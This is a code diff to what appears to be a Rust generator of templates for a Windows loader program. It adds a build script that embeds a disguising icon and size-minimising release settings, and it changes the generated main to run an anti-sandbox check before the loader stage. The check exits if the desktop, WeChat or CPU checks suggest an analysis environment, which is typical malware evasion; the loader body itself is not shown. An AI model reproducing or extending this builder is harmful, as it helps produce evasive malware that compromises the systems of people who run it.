@@ -26,10 +26,16 @@ dirs = "3.0"
 winreg = "0.9"
 reqwest = {{ version = "0.11",features = ["blocking","json"] }}
 
+
+[build-dependencies]
+winres = "0.1"
+
 [profile.release]
 panic = "abort"
 lto = true
 incremental = false
+codegen-units = 1
+opt-level = "z"
 debug = false"#
     )
 }
@@ -104,8 +110,6 @@ pub fn ntloader() -> String {
     "#
     )
 }
-
-
 
 pub fn anti_s() -> String {
     format!(
@@ -200,6 +204,8 @@ fn checke_cpu() -> i32 {{
     }}
 }}
 
+
+
 fn anti_s() {{
     let r1 = check_desktop();
     let r2 = check_wechat_exist();
@@ -209,19 +215,40 @@ fn anti_s() {{
         std::process::exit(0)
     }}
 }}
+
+
 "#
     )
 }
-
-
 
 pub fn main_() -> String {
     format!(
         r#"fn main(){{
         anti_s();
-        ntloader()  
+        ntloader();
     }}
     "#
+    )
+}
+
+pub fn build_() -> String {
+    format!(
+        r#"
+use std::io;
+#[cfg(windows)]
+use winres::WindowsResource;
+
+fn main() -> io::Result<()> {{
+    #[cfg(windows)]
+    {{
+        WindowsResource::new()
+            .set_icon("../icon.ico")
+            .compile()?;
+    }}
+    Ok(())
+}}
+
+"#
     )
 }
 
